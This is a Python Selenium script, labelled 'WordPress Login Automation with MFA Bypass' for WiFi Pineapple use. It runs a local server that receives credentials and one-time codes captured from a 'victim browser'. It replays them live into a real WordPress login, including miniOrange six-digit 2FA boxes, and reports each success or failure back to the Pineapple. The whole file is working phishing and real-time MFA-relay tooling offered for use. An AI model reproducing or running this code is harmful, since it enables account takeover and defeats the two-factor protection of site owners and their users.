#!/usr/bin/env python3
"""
Complete Selenium script for WiFi Pineapple integration
Accepts credentials via curl, then waits for OTP via curl
Usage: python3 wordpress-automation.py --domain https://your-domain.com
"""

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.firefox.service import Service
import time
import threading
import http.server
import socketserver
from urllib.parse import parse_qs, urlparse
import json
import argparse
import sys
import subprocess
import os

def send_mfa_result(result):
    """Send MFA result back to Pineapple"""
    try:
        print(f"📡 Attempting to send MFA result '{result}' to Pineapple...")
        response = subprocess.run([
            "curl", "-s", "-w", "%{http_code}",
            f"http://localhost:9998/mfa_result?status={result}"
        ], capture_output=True, timeout=10, text=True)

        if response.returncode == 0:
            print(f"✅ Successfully sent MFA result '{result}' - HTTP {response.stdout}")
        else:
            print(f"❌ Failed to send MFA result - return code: {response.returncode}")
            print(f"   stderr: {response.stderr}")

    except Exception as e:
        print(f"⚠ Could not send MFA result: {e}")

def send_login_result(result):
    """Send login result back to Pineapple"""
    try:
        print(f"📡 Attempting to send login result '{result}' to Pineapple...")
        response = subprocess.run([
            "curl", "-s", "-w", "%{http_code}",
            f"http://localhost:9998/login_result?status={result}"
        ], capture_output=True, timeout=10, text=True)

        if response.returncode == 0:
            print(f"✅ Successfully sent login result '{result}' - HTTP {response.stdout}")
        else:
            print(f"❌ Failed to send login result - return code: {response.returncode}")
            print(f"   stderr: {response.stderr}")

    except Exception as e:
        print(f"⚠ Could not send login result: {e}")
        # Try alternative method
        try:
            print("🔄 Trying alternative curl method...")
            subprocess.run([
                "curl", "-v",
                f"http://localhost:9998/login_result?status={result}"
            ], timeout=10)
        except:
            print("❌ Alternative method also failed")

def attempt_login(driver, username, password, site, port):
    """Attempt a single login with the provided credentials"""
    try:
        print(f"🚀 Attempting login for {username} at {site}")

        # Navigate to login page (refresh to ensure clean state)
        login_url = f"{site}/wp-login.php"
        print(f"📡 Navigating to {login_url}")
        driver.get(login_url)

        # Wait for login form to load
        print("⏳ Waiting for login form...")
        wait = WebDriverWait(driver, 10)
        username_field = wait.until(EC.presence_of_element_located((By.NAME, "log")))

        # Ensure fields are visible and interactable
        driver.execute_script("arguments[0].scrollIntoView(true);", username_field)

        # Clear any existing input, focus, and fill in credentials
        print(f"👤 Entering username: {username}")
        username_field.click()  # Focus on the field
        username_field.clear()
        time.sleep(0.2)  # Small delay
        username_field.send_keys(username)

        print("🔐 Entering password...")
        password_field = driver.find_element(By.NAME, "pwd")
        password_field.click()  # Focus on the field
        password_field.clear()
        time.sleep(0.2)  # Small delay
        password_field.send_keys(password)

        # Verify the fields were filled correctly
        entered_username = username_field.get_attribute("value")
        entered_password = password_field.get_attribute("value")
        print(f"🔍 Verification - Username field contains: '{entered_username}'")
        print(f"🔍 Verification - Password field length: {len(entered_password)}")

        # Double-check that credentials were entered correctly before submitting
        if entered_username != username:
            print(f"⚠ Username mismatch! Expected: '{username}', Got: '{entered_username}'")
            # Try entering again with JavaScript
            driver.execute_script(f"document.querySelector('input[name=\"log\"]').value = '{username}';")

        if len(entered_password) != len(password):
            print(f"⚠ Password length mismatch! Expected: {len(password)}, Got: {len(entered_password)}")
            # Try entering again with JavaScript
            driver.execute_script(f"document.querySelector('input[name=\"pwd\"]').value = '{password}';")

        # Submit login form
        print("🚀 Submitting login form...")
        login_button = driver.find_element(By.NAME, "wp-submit")
        login_button.click()

        print("⏳ Waiting for login response...")
        login_start = time.time()

        # Smart checking for login result (check up to 10 times = 5 seconds max)
        login_result_detected = False
        for attempt in range(10):
            time.sleep(0.5)
            current_url = driver.current_url
            
            # Check if we've been redirected to wp-admin (success, no MFA)
            if "wp-admin" in current_url:
                elapsed = time.time() - login_start
                print(f"✅ Redirected to wp-admin in {elapsed:.2f}s (no MFA)")
                login_result_detected = True
                break
            
            # Check if MFA digit boxes appeared (success with MFA)
            digit_inputs = []
            for i in range(1, 7):
                try:
                    digit_input = driver.find_element(By.ID, f"mo2f-digit-{i}")
                    digit_inputs.append(digit_input)
                except:
                    pass
            
            if len(digit_inputs) == 6:
                elapsed = time.time() - login_start
                print(f"✅ MFA page detected in {elapsed:.2f}s")
                login_result_detected = True
                break
            
            # Check for error message (failed login)
            page_source = driver.page_source.lower()
            if "incorrect username or password" in page_source or ("error" in page_source and current_url.endswith("wp-login.php")):
                elapsed = time.time() - login_start
                print(f"❌ Login failed detected in {elapsed:.2f}s")
                login_result_detected = True
                break
            
            print(f"   Check #{attempt+1}: Still waiting...")

        # Now check login result
        current_url = driver.current_url
        page_source = driver.page_source.lower()
        print(f"📍 Current URL: {current_url}")
        print(f"🔍 Page title: {driver.title}")

        # Look for the 6-digit input boxes (mo2f-digit-1 through mo2f-digit-6)
        digit_inputs = []
        for i in range(1, 7):
            try:
                digit_input = driver.find_element(By.ID, f"mo2f-digit-{i}")
                digit_inputs.append(digit_input)
            except:
                pass

        print(f"🔍 DEBUG: Found {len(digit_inputs)} digit input boxes")

        # Determine login result and send to Pineapple
        if "wp-admin" in current_url:
            print("✅ LOGIN SUCCESSFUL! (No MFA required)")
            send_login_result("success_no_mfa")
            # Give extra time for the signal to reach Pineapple
            time.sleep(2)
            return "success_no_mfa"

        elif len(digit_inputs) == 6 or any(mfa_indicator in page_source for mfa_indicator in ["mo2f-digit-", "verification", "two-factor", "authenticator"]):
            print("🎯 Found MFA form - login was successful but MFA required!")
            send_login_result("success_mfa_required")
            # Give extra time for the signal to reach Pineapple
            time.sleep(2)

            print("📧 MFA page detected! Starting MFA handler in background...")
            print(f"🔗 Submit OTP in victim browser, or via command line: curl 'http://localhost:{port}/submit-otp?otp=XXXXXX'")

            # Handle MFA process in background thread so portal can proceed
            mfa_thread = threading.Thread(
                target=handle_mfa_process_async,
                args=(driver, port)
            )
            mfa_thread.daemon = True
            mfa_thread.start()

            return "success_mfa_required"

        elif "incorrect username or password" in page_source or "error" in page_source or current_url.endswith("wp-login.php"):
            print("❌ LOGIN FAILED - Invalid credentials")
            send_login_result("failed")
            # Give extra time for the signal to reach Pineapple
            time.sleep(2)
            return "failed"

        else:
            print("❌ Login result unclear - unexpected page")
            print("🔍 Page title:", driver.title)
            send_login_result("failed")
            # Give extra time for the signal to reach Pineapple
            time.sleep(2)

            # Debug: Look for any OTP-related elements
            try:
                otp_elements = driver.find_elements(By.CSS_SELECTOR, "[id*='otp'], [name*='otp'], [class*='otp']")
                print(f"🔍 Found {len(otp_elements)} OTP-related elements")
                for elem in otp_elements[:3]:  # Show first 3
                    print(f"   - {elem.tag_name}: {elem.get_attribute('outerHTML')[:100]}...")
            except:
                pass

            return "failed"

    except Exception as e:
        print(f"❌ Login attempt failed with error: {e}")
        send_login_result("failed")
        return "failed"

class MFAHandler:
    """Handles MFA process with proper callback management"""
    def __init__(self):
        self.otp_callback = None
        self.received_otp = None
        self.otp_received_event = threading.Event()

    def reset_for_new_attempt(self):
        """Reset the handler for a new MFA attempt"""
        print("🔄 Resetting MFA handler for new attempt")
        self.received_otp = None
        self.otp_received_event.clear()

    def set_otp_callback(self):
        def callback(otp):
            print(f"✅ OTP callback triggered with: {otp}")
            # Reset for this new OTP attempt
            self.received_otp = otp
            self.otp_received_event.set()

        self.otp_callback = callback
        return callback

    def handle_mfa_process(self, driver, port):
        """Handle the MFA process"""
        try:
            # Look for digit inputs
            digit_inputs = []
            for i in range(1, 7):
                try:
                    digit_input = driver.find_element(By.ID, f"mo2f-digit-{i}")
                    digit_inputs.append(digit_input)
                except:
                    pass

            if len(digit_inputs) != 6:
                print("❌ Could not find all 6 digit input boxes")
                send_mfa_result("mfa_failed")
                return False

            print(f"✅ Found all 6 digit input boxes, ready for OTP")

            # Reset state for new MFA attempt
            self.reset_for_new_attempt()

            # Wait for OTP to be received
            print("⏳ Waiting for OTP (timeout: 300 seconds)...")
            otp_start_time = time.time()
            if self.otp_received_event.wait(timeout=300):  # 5 minute timeout
                otp_wait_duration = time.time() - otp_start_time
                print(f"✅ Got OTP: {self.received_otp} (waited {otp_wait_duration:.2f}s)")

                # Fill each digit box with the corresponding digit
                if len(self.received_otp) == 6:
                    print("🔢 Filling digit boxes...")

                    # Clear all fields first
                    for i in range(6):
                        try:
                            digit_inputs[i].clear()
                        except:
                            pass

                    # Then fill with new digits
                    for i, digit in enumerate(self.received_otp):
                        try:
                            digit_inputs[i].click()  # Focus on the field
                            digit_inputs[i].clear()  # Clear again to be sure
                            digit_inputs[i].send_keys(digit)
                            print(f"   Digit {i+1}: {digit} ✅")
                            time.sleep(0.2)  # Small delay between inputs
                        except Exception as e:
                            print(f"   Digit {i+1}: {digit} ❌ Error: {e}")

                    print("🔢 All digits entered, clicking validate...")

                    # Click the "Validate" button (mo2f_catchy_validate)
                    try:
                        validate_button = driver.find_element(By.ID, "mo2f_catchy_validate")
                        print("🚀 Found Validate button, clicking...")
                        click_time = time.time()
                        validate_button.click()

                        print("⏳ Waiting for MFA validation...")
                        print(f"⏱️  Click happened at: {click_time}")
                        time.sleep(1)  # Brief initial wait for page to respond

                        # Smart checking for both success AND failure
                        validation_start = time.time()
                        for attempt in range(5):  # Check 5 times over 2.5 seconds
                            check_start = time.time()
                            final_url = driver.current_url
                            
                            # Get visible text from the page (includes modal content)
                            try:
                                body_text = driver.find_element(By.TAG_NAME, "body").text
                            except:
                                body_text = ""
                            
                            print(f"🔍 Check #{attempt+1} at {time.time() - validation_start:.2f}s:")
                            print(f"   URL: {final_url}")
                            
                            # Check for success
                            if "wp-admin" in final_url:
                                elapsed = time.time() - click_time
                                print(f"✅ MFA VALIDATION SUCCESSFUL! (took {elapsed:.2f}s from click)")
                                send_mfa_result("mfa_success")
                                return True
                            
                            # Check for failure indicator in visible text (catches modal content)
                            if "Attempts left" in body_text or "attempts left" in body_text.lower():
                                elapsed = time.time() - click_time
                                print(f"❌ MFA validation failed - 'Attempts left' detected (took {elapsed:.2f}s from click)")
                                print("🔄 Starting new MFA attempt...")
                                send_mfa_result("mfa_failed")
                                return self.handle_mfa_process(driver, port)
                            
                            print(f"   No result yet, sleeping 0.5s (check took {time.time() - check_start:.3f}s)")
                            time.sleep(0.5)

                        # If we get here, timeout without clear result
                        total_elapsed = time.time() - click_time
                        print(f"❌ MFA validation unclear after {total_elapsed:.2f}s")
                        print("🔍 Current page title:", driver.title)
                        print("🔍 Current URL:", driver.current_url)
                        print("🔍 Page body text (first 500 chars):")
                        try:
                            print(driver.find_element(By.TAG_NAME, "body").text[:500])
                        except:
                            print("(could not retrieve body text)")
                        send_mfa_result("mfa_failed")
                        return self.handle_mfa_process(driver, port)

                    except Exception as e:
                        print(f"❌ Could not find/click validate button: {e}")
                        # Try alternative submission methods
                        try:
                            print("🔄 Trying alternative submission...")
                            driver.execute_script("jQuery('#mo2f_catchy_validate').click();")
                            
                            # Same smart checking for alternative method
                            time.sleep(1)
                            for attempt in range(5):  # Check 5 times over 2.5 seconds
                                final_url = driver.current_url
                                
                                try:
                                    body_text = driver.find_element(By.TAG_NAME, "body").text
                                except:
                                    body_text = ""
                                
                                if "wp-admin" in final_url:
                                    send_mfa_result("mfa_success")
                                    return True
                                
                                if "Attempts left" in body_text or "attempts left" in body_text.lower():
                                    print("❌ Alternative submission failed - trying again...")
                                    send_mfa_result("mfa_failed")
                                    return self.handle_mfa_process(driver, port)
                                
                                time.sleep(0.5)
                            
                            print("❌ Alternative submission timeout")
                            send_mfa_result("mfa_failed")
                            return self.handle_mfa_process(driver, port)
                        except:
                            print("❌ Alternative submission failed")
                            send_mfa_result("mfa_failed")
                            return self.handle_mfa_process(driver, port)

                else:
                    print(f"❌ OTP must be exactly 6 digits, got: {len(self.received_otp)}")
                    print("🔄 Waiting for new OTP...")
                    return self.handle_mfa_process(driver, port)
            else:
                print("⏰ Timeout waiting for OTP")
                send_mfa_result("mfa_failed")
                return False

        except Exception as e:
            print(f"❌ MFA handling failed: {e}")
            import traceback
            traceback.print_exc()
            send_mfa_result("mfa_failed")
            return False

# Global MFA handler
mfa_handler = MFAHandler()

def handle_mfa_process_async(driver, port):
    """Handle the MFA process asynchronously in background"""
    mfa_handler.handle_mfa_process(driver, port)

def start_login_server(driver, default_domain, port=8080):
    """Start HTTP server to receive credentials and OTP"""

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            if self.path.startswith('/start-login?'):
                parsed = urlparse(self.path)
                params = parse_qs(parsed.query)
                username = params.get('username', [''])[0]
                password = params.get('password', [''])[0]
                site = params.get('site', [''])[0]

                if username and password:
                    print(f"\n📱 Received NEW credentials: {username} / {password}")
                    target_site = site if site else default_domain
                    print(f"🌐 Target site: {target_site}")

                    # Set up MFA callback for new session
                    mfa_handler.otp_callback = mfa_handler.set_otp_callback()

                    # Attempt login immediately
                    login_result = attempt_login(driver, username, password, target_site, port)

                    # Wait a bit for the login result to be sent to Pineapple
                    time.sleep(1)

                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    self.wfile.write(f'<html><body><h1>Login Attempt Complete!</h1><p>Result: {login_result}</p></body></html>'.encode())
                else:
                    self.send_response(400)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    self.wfile.write(b'<html><body><h1>Error</h1><p>Missing username or password</p></body></html>')

            elif self.path.startswith('/submit-otp?'):
                parsed = urlparse(self.path)
                params = parse_qs(parsed.query)
                otp = params.get('otp', [''])[0]

                if otp and mfa_handler.otp_callback:
                    print(f"📱 Received OTP: {otp} - triggering callback")
                    mfa_handler.otp_callback(otp)

                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    self.wfile.write(b'<html><body><h1>OTP Received!</h1><p>Check your browser...</p></body></html>')
                elif otp:
                    print(f"📱 Received OTP: {otp} but no callback available")
                    self.send_response(400)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    self.wfile.write(b'<html><body><h1>Error</h1><p>No active MFA session</p></body></html>')
                else:
                    self.send_response(400)
                    self.end_headers()
            else:
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                html = '''
                <html>
                <head><title>WordPress Login Automation</title></head>
                <body>
                    <h2>WordPress Login Automation Server</h2>
                    <h3>Usage:</h3>
                    <p><strong>Start Login:</strong><br>
                    <code>curl "http://localhost:8080/start-login?username=USER&password=PASS&site=https://example.com"</code></p>

                    <p><strong>Submit OTP:</strong><br>
                    <code>curl "http://localhost:8080/submit-otp?otp=123456"</code></p>

                    <h3>Status:</h3>
                    <p>Server is running and waiting for commands...</p>
                    <p>🌐 Browser is ready and waiting for login attempts!</p>
                </body>
                </html>
                '''
                self.wfile.write(html.encode())

        def log_message(self, format, *args):
            pass

    server = socketserver.TCPServer(("", port), Handler)
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.daemon = True
    server_thread.start()

    return server

def perform_wordpress_login(default_domain, port=8080, headless=False):
    print("🔥 Starting WordPress Login Automation Server...")
    print(f"🎯 Default target domain: {default_domain}")

    # Check if DISPLAY is set, if not and not headless, set it automatically
    if not headless:
        if 'DISPLAY' in os.environ:
            print(f"✅ Using existing DISPLAY: {os.environ['DISPLAY']}")
        else:
            print("⚠ DISPLAY not set - attempting to set DISPLAY=:0")
            os.environ['DISPLAY'] = ':0'
            print(f"✅ Set DISPLAY to: {os.environ['DISPLAY']}")

    # Configure Firefox options
    options = Options()
    if headless:
        options.add_argument("--headless")

    # Configure Firefox service with explicit geckodriver path for Termux
    service = Service('/data/data/com.termux/files/usr/bin/geckodriver')
    options.binary_location = '/data/data/com.termux/files/usr/bin/firefox'

    # Start Firefox with explicit service and options
    print("🌐 Opening Firefox browser...")
    driver = webdriver.Firefox(service=service, options=options)

    try:
        # Navigate to the login page immediately so it's ready
        login_url = f"{default_domain}/wp-login.php"
        print(f"📡 Loading login page: {login_url}")
        driver.get(login_url)

        # Start credential/OTP server with driver reference
        server = start_login_server(driver, default_domain, port)
        print(f"🌐 Server started at http://localhost:{port}")
        print("")
        print("📋 Usage:")
        print(f"   Submit login via victim browser, or via command line: curl 'http://localhost:9999/start-login?username=USER&password=PASS&site={default_domain}'")
        print("   Submit OTP via victim browser, or via command line:  curl 'http://localhost:9999/submit-otp?otp=XXXXXX'")
        print("")
        print("✅ Firefox is ready! Waiting for login requests...")
        print("💡 You can now submit multiple login attempts - each will be processed immediately!")
        print("Press Ctrl+C to exit and close browser")

        # Keep the main thread alive and ready for multiple requests
        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        print("\n👋 Closing browser...")
    except Exception as e:
        print(f"❌ Error occurred: {e}")
        import traceback
        traceback.print_exc()
    finally:
        try:
            driver.quit()
        except:
            pass
        try:
            server.shutdown()
        except:
            pass

def validate_domain(domain):
    """Validate and normalize the domain URL"""
    if not domain:
        return None

    # Add https:// if no protocol specified
    if not domain.startswith(('http://', 'https://')):
        domain = 'https://' + domain

    # Remove trailing slash
    domain = domain.rstrip('/')

    return domain

def write_domain_config(domain):
    """Write domain configuration for PHP to read"""
    config_content = f'<?php\n$target_domain = "{domain}";\n?>'

    try:
        # Write to a config file that PHP can include
        with open('/tmp/target_domain.php', 'w') as f:
            f.write(config_content)
        print(f"📝 Wrote domain config to /tmp/target_domain.php")

        # Also write as environment variable format
        with open('/tmp/target_domain.env', 'w') as f:
            f.write(f'TARGET_DOMAIN={domain}\n')
        print(f"📝 Wrote domain config to /tmp/target_domain.env")

    except Exception as e:
        print(f"⚠  Warning: Could not write domain config: {e}")
        print("📋 Manual setup required - update helper.php with your domain")

def main():
    parser = argparse.ArgumentParser(
        description='WordPress Login Automation with MFA Bypass',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  python3 %(prog)s --domain https://example.com
  python3 %(prog)s -d example.com --port 9000
  python3 %(prog)s --domain https://my-site.org --port 8080
        '''
    )

    parser.add_argument(
        '-d', '--domain',
        required=True,
        help='Target WordPress domain (e.g., https://example.com or example.com)'
    )

    parser.add_argument(
        '-p', '--port',
        type=int,
        default=8080,
        help='Port for the automation server (default: 8080)'
    )

    parser.add_argument(
        '--headless',
        action='store_true',
        help='Run browser in headless mode (no GUI)'
    )

    args = parser.parse_args()

    # Validate and normalize domain
    domain = validate_domain(args.domain)
    if not domain:
        print("❌ Error: Invalid domain specified")
        sys.exit(1)

    print(f"🎯 Target domain: {domain}")
    print(f"🌐 Server port: {args.port}")

    if args.headless:
        print("🤖 Running in headless mode")

    try:
        perform_wordpress_login(domain, args.port, args.headless)
    except KeyboardInterrupt:
        print("\n👋 Exiting...")
    except Exception as e:
        print(f"❌ Fatal error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
